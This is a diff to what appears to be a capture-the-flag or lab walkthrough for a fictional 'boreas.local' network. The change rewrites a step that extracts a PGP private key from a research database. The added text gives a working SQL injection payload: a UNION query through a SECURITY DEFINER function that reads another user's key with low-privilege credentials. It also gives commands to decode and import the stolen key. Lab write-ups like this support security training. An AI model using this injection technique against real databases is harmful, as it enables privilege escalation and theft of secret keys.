@@ -265,11 +265,16 @@ This is a multi-asset chain: A6 → A8 → A7.
    ```
    It hints that the private key is stored on the research database (`researchdb.boreas.local`), in `compartment_b.key_storage`.
 
-3. Get the private key from A8. You need `lab_weapons` access (via the SQLi from flag 27, or via `vasik`'s credentials):
+3. Get the private key from A8. You don't need direct `lab_weapons` access — re-use the flag 27 SQLi against the `SECURITY DEFINER` `research_public.search_research` function with Shah's `lab_general` cred. The function is defined with OUT params (`title text, authors text, abstract text`), so the UNION needs to project exactly three text columns. Don't add an `AS r(...)` column-definition list — postgres rejects it with "a column definition list is redundant for a function with OUT parameters" — just `SELECT *`:
    ```sql
-   SELECT key_data FROM compartment_b.key_storage WHERE key_owner = 'e.vasik';
+   SELECT * FROM research_public.search_research(
+     'x'' UNION SELECT key_data::text, key_owner::text, ''k''::text
+      FROM compartment_b.key_storage WHERE key_owner = ''e.vasik''--'
+   );
    ```
-   The result is base64-encoded. Decode and import it:
+   (If you have direct `lab_weapons` or `vasik` cleartext creds you can also `SELECT key_data FROM compartment_b.key_storage WHERE key_owner = 'e.vasik';` directly.)
+
+   The result is the PGP private key block stored as base64 in `key_data`. Decode and import:
    ```
    echo "<base64_data>" | base64 -d > vasik_private.asc
    gpg --import vasik_private.asc
